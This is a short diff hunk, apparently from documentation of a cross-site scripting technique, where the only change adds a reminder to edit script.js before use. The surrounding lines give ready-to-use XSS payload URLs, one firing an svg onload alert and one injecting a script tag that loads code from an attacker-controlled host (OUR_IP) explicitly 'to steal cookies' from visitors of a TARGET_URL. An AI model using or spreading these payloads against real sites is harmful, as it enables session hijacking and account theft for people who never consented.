@@ -18,7 +18,7 @@ http://OUR_IP/index.php/<svg/onload=alert(document.domain)>?target=TARGET_URL
 
 *Note: Replace OUR_IP and TARGET_URL as appropriate.*
 
-or to steal cookies:
+or to steal cookies (replace OUR_IP in script.js first):
 
 ```
 http://OUR_IP<script src=http://OUR_IP/script.js></script>?target=TARGET_URL
